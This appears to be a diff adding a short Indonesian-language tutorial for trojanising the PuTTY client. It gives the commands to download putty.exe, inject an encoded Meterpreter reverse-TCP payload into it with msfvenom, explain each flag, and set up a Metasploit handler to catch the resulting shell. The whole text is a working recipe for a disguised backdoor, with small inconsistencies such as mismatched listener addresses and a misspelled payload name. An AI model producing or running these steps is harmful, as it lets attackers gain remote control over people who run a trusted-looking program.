@@ -1,0 +1,29 @@
+wget http://the.earth.li/~sgtatham/putty/latest/x86/putty.exe
+
+msfvenom -a x86 --platform windows -x putty.exe -k -p windows/meterpreter/reverse_tcp lhost=192.168.43.233 -e x86/shikata_ga_nai -i 3 -b "\x00" -f exe -o puttyXploit.exe
+
+Keterangan :
+- a adalah architecture yang digunakan
+--platform adalah platform payload yang di buat
+-x posisi atau letak file exe yang hendak di injeksi
+-k perintah untuk mertahankan perilaku template(file.exe) dan menyuntikkan payload sebagai thread      baru
+-p perintah untuk menentukan tipe payload
+    windows/meterpreter/reverse_tcp adalah tipe payload yang digunakan
+-lhost adalah alamat IP kita
+-lport adalah yang akan kita gunakan dalam menjalankan listener ( reverse )
+-e untuk memilih encoder yang digunakan x86/shikata_ga_nai adalah encoder yang digunakan
+-i iterations (jumlah encode payload)
+-f format output
+-o output hasil file yang telah di injeksi ( backdoor result )
+
+msfconsole
+
+use /exploit/multi/handler
+
+set payload windows/metepreter/reverse_tcp
+
+set lhost 192.168.43.140
+
+set lport 8080
+
+exploit
